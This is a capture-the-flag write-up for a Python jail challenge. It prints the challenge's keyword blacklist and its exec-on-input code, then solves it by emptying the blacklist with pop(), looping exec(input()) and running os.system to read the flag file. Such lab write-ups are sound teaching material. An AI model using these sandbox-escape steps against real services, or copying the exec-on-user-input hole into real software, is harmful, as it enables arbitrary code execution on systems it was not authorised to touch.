# Big Blacklist

>*Description*: That's a big blacklist for a pyjail challenge, don't you think?  
Author: NoobMaster

<br>

- Running `nc challs.n00bzunit3d.xyz 8412` gives us the following text  
    
        =========================
        #!/usr/bin/env python3
        blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile","globals","os","import","_","breakpoint","exit","lambda","eval","exec","read","print","open","'","=",'"',"x","builtins","clear"]
        print("="*25)
        print(open(__file__).read())
        print("="*25)
        print("Welcome to the jail!")
        print("="*25)

        for i in range(2):
            x = input('Enter command: ')
            for c in blacklist:
                if c in x:
                    print("Blacklisted word found! Exiting!")
                    exit(0)
            exec(x)

        =========================
        Welcome to the jail!
        =========================
        Enter command:  

    Note: We only get two tries  

<br>

- pop() is a function in python that deletes the last element from a list.  
We can use a simple loop to delete all the items from the list.  
   
        for i in range(len(blacklist)):blacklist.pop()  

<br>

- With another loop we can enter as many commands as we want.
    
        while True:exec(input())

Note: There is a time limit.  

<br>

- There are many different ways to solve this now.

        import os
        os.system('ls')
        flag.txt
        jail.py
        os.system('cat flag.txt')
        n00bz{blacklist.pop()_ftw!_7a5d2f8b}  

<br>

[Official Writeup](https://github.com/n00bzUnit3d/n00bzCTF2023-OfficalWriteups/tree/master/Misc/Pyjail%201)

### Flag - n00bz{blacklist.pop()_ftw!_7a5d2f8b}
